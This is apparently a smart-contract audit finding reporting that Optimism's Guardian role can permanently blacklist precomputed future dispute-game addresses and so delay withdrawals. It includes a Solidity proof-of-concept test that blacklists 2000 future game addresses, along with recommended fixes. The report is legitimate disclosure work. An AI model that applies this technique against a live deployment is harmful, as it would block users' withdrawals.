Curly Turquoise Ram

high

# Guardian role can be abused to delay withdrawals even when replaced

## Summary

Due to the uni-directional blacklisting functionality and `disputeGameFactory` usage of the `CREATE` opcode to deploy games - The `Guardian` can abuse his restricted capability to blacklist future dispute games. Such act will delay withdrawals and cannot be fixed by replacing the Guardian.

## Vulnerability Detail

`DisputeGameFactory` uses `clones-with-immutable-args` (https://github.com/Saw-mon-and-Natalie/clones-with-immutable-args) to deploy the proxy `FaultDisputeGame` game.
The clone implementation uses the `CREATE` opcode to create the game.
https://github.com/Saw-mon-and-Natalie/clones-with-immutable-args/blob/main/src/ClonesWithImmutableArgs.sol#L147
```solidity
    function clone(address implementation, bytes memory data)
        internal
        returns (address payable instance)
    {
---------------------
            instance := create(0, ptr, creationSize)
---------------------
    }
```
The `CREATE` opcode calculates the deployed address using `address` and `nonce` of (DisputeGameFactory).
Therefore - the addresses of the next games can be accurately calculated no matter what the claim is.

The `Guardian` can blacklist and game:
https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/L1/OptimismPortal2.sol#L440
```solidity
    function blacklistDisputeGame(IDisputeGame _disputeGame) external {
        require(msg.sender == guardian(), "OptimismPortal: only the guardian can blacklist dispute games");
        disputeGameBlacklist[_disputeGame] = true;
    }
``` 

Notice that the guardian cannot un-blacklist a game. 

Therefore a `guardian` can abuse his role ***in a single transaction***:
1. Calculate a large amount of future game proxy addresses
2. Blacklist the large amount of future game proxy addresses.

When that happens - the OP Superchain config owner will replace the guardian, however it will be to late because:
1. Guardian cannot un-blacklist the game
2. Changing the respected game type will not help since the calculated address is not related to the game implementation

## Impact

1. Withdrawal delay
2. Detachment of the OptimismPortal2 and the `DisputeGameFactory` (games can still be created but not used)

## Code Snippet

### POC

Add the following functions to `OptimismPortal2.t.sol`:
```solidity
    // Calculate next CREATE output for disputeGameFactory
    function calculateGameAddress(uint256 nonce) internal view returns (address) {
        address addr = address(disputeGameFactory);
        bytes memory data;
        bytes1 len = bytes1(0x94);
        if (nonce <= 0x7f) data = abi.encodePacked(bytes1(0xd6), len, addr, uint8(nonce));
        else if (nonce <= type(uint8).max) data = abi.encodePacked(bytes1(0xd7), len, addr, bytes1(0x81), uint8(nonce));
        else if (nonce <= type(uint16).max) data = abi.encodePacked(bytes1(0xd8), len, addr, bytes1(0x82), uint16(nonce));

        return address(uint160(uint256(keccak256(data))));
    }

    function test_blacklist_guardian_future_games() external {
        // disputeGameFactory nonce is current 2
        uint256 starting_nonce = 2;
        // blacklist the next 2000 game creations
        uint256 ending_nonce = starting_nonce + 2000;

        vm.startPrank(optimismPortal2.guardian());
        for(uint256 nonce = starting_nonce; nonce <= ending_nonce; nonce++){
            // Calculate the next game addr by calculating the result
            // of CREATE opcode in disputeGameFactory: keccak256(rlp([disputeGameFactory,nonce]))[12:]
            address calculated_game_addr = calculateGameAddress(nonce);

            // Blacklist the calculated game
            optimismPortal2.blacklistDisputeGame(IDisputeGame(calculated_game_addr));
        }

        /// VALIDATE //
        // Just for validation that we calculated correctly - deploy games and check if they are blacklisted
        for(uint256 nonce = starting_nonce; nonce <= ending_nonce; nonce++){
            // Deploy game using the factory
            IDisputeGame deployed_addr = disputeGameFactory.create(
                optimismPortal2.respectedGameType(), Claim.wrap(hex""), abi.encode(_proposedBlockNumber + nonce)
            );

            // Validate that the deployed address is already blacklisted
            assertEq(optimismPortal2.disputeGameBlacklist(deployed_addr), true, "Game proxy calculated addr and deployed address do not match");
        }
    }
```

To run the POC:
```solidity
forge test --match-test "test_blacklist_guardian_future_games"
```

## Tool used

Manual Review

## Recommendation

Consider:
1. Allow blacklisting to created games only:  ` disputeGameProxy.createdAt().raw() != 0`
2. Modify CWIA to use CREATE2 instead
3. Allow Guardian to un-blacklist games
